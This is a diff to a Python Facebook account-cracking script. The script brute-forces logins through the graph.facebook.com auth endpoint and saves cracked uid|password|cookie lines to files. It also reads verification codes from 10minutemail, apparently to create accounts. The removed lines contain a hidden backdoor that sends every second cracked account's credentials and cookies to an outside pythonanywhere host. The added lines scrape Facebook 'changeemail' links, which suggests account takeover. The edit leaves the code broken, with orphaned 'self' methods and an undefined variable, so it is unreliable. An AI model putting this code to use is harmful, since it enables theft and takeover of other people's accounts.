@@ -1442,9 +1442,8 @@ def mbasic(uid,pwx,tl):
     except Exception as e:
         pass
 
-class create_fb:
        #--> Generate Email & Code From 10minutemail
-  def get_email_10minutemail(self):
+def get_email_10minutemail(self):
     req = bs(self.abc.get('https://10minutemail.net/m/?lang=id',headers=self.head_email,allow_redirects=True).content,'html.parser')
     self.ses_email = re.search('sessionid="(.*?)"',str(req)).group(1)
     self.tim_email = str(time.time()).replace('.','')[:13]
@@ -1454,13 +1453,13 @@ class create_fb:
     self.cookie_email = '; '.join([str(x)+"="+str(y) for x,y in self.abc.cookies.get_dict().items()])
     return(email)
 
-  def get_code_10minutemail(self):
+def get_code_10minutemail(self):
     dat = {'new':'0','sessionid':self.ses_email,'_':self.tim_email}
     pos = self.abc.post('https://10minutemail.net/address.api.php',data=dat,headers=self.head_email,cookies={'cookie':self.cookie_email},allow_redirects=True).json()
     kode = re.search(r'FB-([^ ]+)',str(pos)).group(1)
     return(kode)
 
-  def p(uid,pwx,tl):
+def p(uid,pwx,tl):
     global loop
     global oks
     global cps
@@ -1517,34 +1516,27 @@ class create_fb:
             'Content-Length': '1026'}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
-            print(result)
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                    else:
-                        bkas.append(uid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
-                           break
-            else:
-                continue
+            headers = {
+            'accept': 'text/html,application/xhtm 1+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-encoding': 'gzip, deflate',
+            'accept-language': 'en-US, en;q=0.9, en-US;q=0.8, en;q=0.7',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not: A-Brand"; v="99", "Chromium";V="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand"; v "99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '21',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36'}
+            for i in  re.findall('href="/changeemail(.*?)"',response.text):
+               url="/changeemail"+i
+            response = requests.get("https://m.facebook.com"+url, headers=headers)
+            print(response)
         loop+=1
     except net_error:
         time.sleep(10)
